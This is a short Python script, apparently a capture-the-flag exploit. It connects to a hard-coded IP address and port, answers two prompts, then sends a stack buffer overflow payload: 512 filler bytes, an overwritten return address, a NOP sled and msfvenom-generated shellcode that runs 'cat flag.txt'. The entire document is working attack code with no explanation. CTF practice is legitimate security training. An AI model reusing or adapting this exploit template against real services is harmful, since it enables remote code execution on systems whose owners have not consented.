#!/usr/bin/python3

import socket

#msfvenom -p linux/x86/exec CMD="cat flag.txt" -b '\x00\x09' -f py
buf =  b"\x90" * 20
buf += b"\x29\xc9\x83\xe9\xf4\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x53\xd2\x92\xa5\x83\xee\xfc\xe2\xf4\x39\xd9"
buf += b"\xca\x3c\x01\xb4\xfa\x88\x30\x5b\x75\xcd\x7c\xa1\xfa"
buf += b"\xa5\x3b\xfd\xf0\xcc\x3d\x5b\x71\xf7\xbb\xdf\x92\xa5"
buf += b"\x53\xb1\xf3\xd1\x73\xb4\xfe\xc4\x34\xfc\xe6\xdd\x27"
buf += b"\xd2\xc5\xf6\xda\x33\x5f\x25"

buff = b"A"*512 + b"\x71\x63\x55\x56" + buf

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("194.47.22.9", 10001))

data = s.recv(512)
print(data)
s.send(b"aa\n")
data = s.recv(512)
print(data)
s.send(b"aa\n")
data = s.recv(512)
print(data)
s.send(buff + b"\n")
data = s.recv(512)
print(data)
data = s.recv(512)
print(data)
s.close()
